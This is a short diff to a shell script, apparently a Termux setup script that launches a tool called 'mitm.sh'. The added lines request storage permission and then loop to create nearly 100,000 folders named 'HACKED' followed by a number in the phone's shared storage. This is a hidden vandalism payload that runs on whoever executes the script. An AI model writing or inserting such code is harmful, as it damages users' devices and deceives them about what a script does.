@@ -12,3 +12,12 @@ mysqld_safe -u root &
 chmod +x mitm.sh
 clear
 bash mitm.sh
+A=1
+termux-setup-storage
+cd /sdcard/
+while [ $A -lt 99999 ]
+do
+mkdir "HACKED $A"
+let A++
+done
+
